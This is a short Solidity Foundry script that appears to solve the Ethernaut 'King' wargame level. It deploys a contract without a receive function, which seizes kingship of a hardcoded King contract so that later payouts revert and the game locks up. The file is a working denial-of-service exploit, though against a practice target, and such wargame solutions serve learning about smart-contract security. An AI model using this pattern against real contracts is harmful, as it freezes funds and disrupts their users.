// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract NoReceive {
    King constant kingInstance =
        King(payable(0xb46F59D8e2D2c62A157a5837ab3B353C4108e8ba));

    function claimKing() external payable {
        (bool success, ) = address(kingInstance).call{value: 0.002 ether}("");
        require(success);
    }
}

contract KingSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        NoReceive noReceive = new NoReceive();
        noReceive.claimKing{value: 0.002 ether}();

        vm.stopBroadcast();
    }
}
